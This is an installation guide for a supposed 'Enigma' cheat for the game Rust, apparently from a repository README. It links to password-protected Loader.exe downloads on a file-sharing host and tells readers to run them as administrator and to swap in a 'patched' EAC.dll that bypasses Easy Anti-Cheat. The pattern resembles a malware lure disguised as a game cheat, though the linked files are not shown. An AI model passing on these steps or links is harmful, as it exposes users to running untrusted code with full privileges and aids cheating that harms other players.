## 💾 Installation

> ❗ **Important:**  
> The following installation instructions simulate how a cheat like *Enigma* might be injected or loaded into Rust.  

### 🧭 Step-by-step

1. **Download the loader**  
   [Download](https://www.4sync.com/web/directDownload/Lh-numdh/cKQ38aak.59488ffcf9e28923ee42c908e3a6290e) and place `Loader.exe` in any folder **outside** of the Rust directory. **Password ENIGMA**
   >If file dont open, download [this file](https://www.4sync.com/web/directDownload/4Ufzz5vy/cKQ38aak.ef87275520de9805aa0b0c059fbb002c) and replace EXE file
   >**Password replace**

3. **Run the loader**  
   Launch `Loader.exe` as administrator. 

4. **Patch Easy Anti-Cheat**  
   Locate the Rust game directory (e.g., `C:\Program Files (x86)\Steam\steamapps\common\Rust`)  
   Replace the existing `EAC.dll` file with the modified one provided (`EAC.dll` → patched version).  
   > ⚠️ *This bypasses the anti-cheat initialization.*

5. **Launch the game**  
   Start Rust normally through Steam or the loader. The cheat interface should appear in-game.
